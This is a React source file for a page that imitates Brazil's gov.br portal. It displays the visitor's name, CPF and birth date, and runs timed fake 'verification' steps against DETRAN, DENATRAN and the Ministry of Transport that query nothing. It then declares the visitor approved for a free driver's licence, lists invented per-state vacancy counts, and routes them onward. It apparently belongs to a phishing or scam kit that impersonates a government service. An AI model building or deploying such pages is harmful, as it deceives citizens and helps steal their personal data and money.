import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { User, CheckCircle, Loader2 } from 'lucide-react';

const VerificationHeader: React.FC<{ userName?: string }> = ({ userName }) => (
    <header className="bg-white border-b border-gray-200">
        <div className="max-w-4xl mx-auto px-4">
            <div className="py-3 flex items-center justify-between">
                <img src="/Gov.br_logo.svg.png" alt="gov.br" className="h-8 md:h-10" />
                <button className="flex items-center gap-2 bg-[#004381] text-white px-4 py-1.5 rounded-full text-sm font-medium hover:bg-blue-900 transition-colors">
                    <User size={18} />
                    <span>{userName || 'Entrar'}</span>
                </button>
            </div>
        </div>
    </header>
);

interface UserData {
    name: string;
    cpf: string;
    birthDate: string;
}

const UserInfo: React.FC<{ userData: UserData }> = ({ userData }) => (
    <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
        <div>
            <label className="text-sm text-gray-500">Nome Completo</label>
            <p className="p-3 bg-gray-100 border border-gray-200 rounded-lg truncate">{userData.name}</p>
        </div>
        <div>
            <label className="text-sm text-gray-500">CPF</label>
            <p className="p-3 bg-gray-100 border border-gray-200 rounded-lg">{userData.cpf}</p>
        </div>
        <div>
            <label className="text-sm text-gray-500">Nascimento</label>
            <p className="p-3 bg-gray-100 border border-gray-200 rounded-lg">{userData.birthDate}</p>
        </div>
    </div>
);

const VerificationSteps: React.FC<{ steps: { text: string; status: 'completed' | 'loading' | 'pending' }[] }> = ({ steps }) => (
    <div className="space-y-4">
        {steps.map((step, index) => (
            <div key={index} className="flex items-center gap-4 p-4 bg-gray-50 rounded-lg">
                {step.status === 'completed' && <CheckCircle className="text-green-500 w-6 h-6 flex-shrink-0" />}
                {step.status === 'loading' && <Loader2 className="text-blue-500 w-6 h-6 animate-spin flex-shrink-0" />}
                {step.status === 'pending' && <div className="w-6 h-6 border-2 border-gray-300 rounded-full flex-shrink-0" />}
                <span className={`text-lg ${step.status === 'pending' ? 'text-gray-400' : 'text-gray-800'}`}>
                    {step.text}
                </span>
            </div>
        ))}
    </div>
);

const SuccessDisplay: React.FC<{ userData: UserData }> = ({ userData }) => {
    const navigate = useNavigate();
    const detrans = [
        { state: 'Acre', vagas: 91 }, { state: 'Alagoas', vagas: 87 }, { state: 'Amapá', vagas: 45 },
        { state: 'Amazonas', vagas: 112 }, { state: 'Bahia', vagas: 230 }, { state: 'Ceará', vagas: 180 },
        { state: 'Distrito Federal', vagas: 155 }, { state: 'Espírito Santo', vagas: 99 }, { state: 'Goiás', vagas: 176 },
        { state: 'Maranhão', vagas: 140 }, { state: 'Mato Grosso', vagas: 125 }, { state: 'Mato Grosso do Sul', vagas: 110 },
        { state: 'Minas Gerais', vagas: 350 }, { state: 'Pará', vagas: 190 }, { state: 'Paraíba', vagas: 105 },
        { state: 'Paraná', vagas: 280 }, { state: 'Pernambuco', vagas: 210 }, { state: 'Piauí', vagas: 95 },
        { state: 'Rio de Janeiro', vagas: 320 }, { state: 'Rio Grande do Norte', vagas: 85 }, { state: 'Rio Grande do Sul', vagas: 290 },
        { state: 'Rondônia', vagas: 70 }, { state: 'Roraima', vagas: 35 }, { state: 'Santa Catarina', vagas: 250 },
        { state: 'São Paulo', vagas: 550 }, { state: 'Sergipe', vagas: 60 }, { state: 'Tocantins', vagas: 55 }
    ];

    return (
        <div>
            <div className="bg-green-50 border-l-8 border-green-500 p-6 rounded-r-lg mb-8">
                <h2 className="text-2xl font-bold text-green-800 mb-4">Parabéns! Cadastro Aprovado com Sucesso</h2>
                <p className="text-gray-700 leading-relaxed">
                    Prezado(a) <strong>{userData.name}</strong>, CPF <strong>{userData.cpf}</strong>, informamos que sua solicitação foi analisada e <strong>APROVADA</strong> pelo Sistema Nacional de Habilitação.
                </p>
                <p className="text-gray-700 leading-relaxed mt-2">
                    O(A) senhor(a) está apto(a) a obter a Carteira Nacional de Habilitação (CNH) de forma <strong>gratuita</strong>, sem a necessidade de frequentar autoescola, conforme as diretrizes do Programa CNH do Brasil.
                </p>
                <p className="text-gray-700 leading-relaxed mt-2">
                    Para dar continuidade ao processo, selecione abaixo o DETRAN correspondente ao seu estado de residência.
                </p>
            </div>
            <h3 className="text-xl font-bold text-center text-gray-800 mb-6">Selecione o DETRAN do seu Estado</h3>
            <div className="space-y-4">
                {detrans.map((detran) => (
                    <div key={detran.state} className="flex items-center justify-between p-4 border rounded-lg bg-white shadow-sm">
                        <div>
                            <p className="font-bold text-lg text-gray-800">Detran {detran.state}</p>
                            <span className="text-sm bg-blue-100 text-blue-800 font-semibold px-2 py-1 rounded-full">{detran.vagas} vagas</span>
                        </div>
                        <button 
                            onClick={() => navigate('/category-selection', { state: { userData } })}
                            className="bg-[#0d6efd] text-white px-6 py-2 rounded-lg font-bold hover:bg-blue-700 transition-colors"
                        >
                            Iniciar Processo
                        </button>
                    </div>
                ))}
            </div>
        </div>
    );
};

const VerificationPage: React.FC = () => {
    const location = useLocation();
    const navigate = useNavigate();
    const [isVerifying, setIsVerifying] = useState(true);
    const [userData, setUserData] = useState<UserData | null>(null);
    const [steps, setSteps] = useState([
        { text: 'Verificando dados junto ao DETRAN', status: 'completed' as const },
        { text: 'Consultando elegibilidade do CPF no DENATRAN', status: 'loading' as const },
        { text: 'Verificando disponibilidade de vagas no programa', status: 'pending' as const },
        { text: 'Analisando documentação junto ao Ministério dos Transportes', status: 'pending' as const },
    ]);

    useEffect(() => {
        if (location.state && location.state.userData) {
            setUserData(location.state.userData);
        } else {
            navigate('/login');
            return;
        }

        const timers = [
            setTimeout(() => setSteps(prev => prev.map((s, i) => i === 1 ? { ...s, status: 'completed' } : i === 2 ? { ...s, status: 'loading' } : s)), 2000),
            setTimeout(() => setSteps(prev => prev.map((s, i) => i === 2 ? { ...s, status: 'completed' } : i === 3 ? { ...s, status: 'loading' } : s)), 4000),
            setTimeout(() => setSteps(prev => prev.map((s, i) => i === 3 ? { ...s, status: 'completed' } : s)), 6000),
            setTimeout(() => setIsVerifying(false), 6500),
        ];

        return () => timers.forEach(clearTimeout);
    }, [location, navigate]);

    if (!userData) return null;

    const firstName = userData?.name.split(' ')[0];

    return (
        <div className="bg-gray-50 min-h-screen">
            <VerificationHeader userName={firstName} />
            <main className="max-w-3xl mx-auto px-4 py-12">
                <div className="bg-white p-8 rounded-lg shadow-md border border-gray-200">
                    <UserInfo userData={userData} />
                    <hr className="my-8" />
                    {isVerifying ? <VerificationSteps steps={steps} /> : <SuccessDisplay userData={userData} />}
                </div>
            </main>
        </div>
    );
};

export default VerificationPage;